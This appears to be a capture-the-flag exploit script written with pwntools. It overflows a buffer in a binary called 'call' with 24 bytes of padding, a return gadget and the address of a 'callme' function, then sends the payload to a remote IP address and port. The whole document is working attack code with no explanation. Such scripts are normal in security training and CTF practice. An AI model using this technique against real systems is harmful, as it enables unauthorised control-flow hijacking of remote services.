from pwn import *
elf=ELF("./call")
payload=b"A"*24+p64(0x0040101a)+p64(elf.symbols['callme'])
p=remote("3.131.69.179",12345)
p.sendlineafter(b"something : ",payload)
print(p.recvall())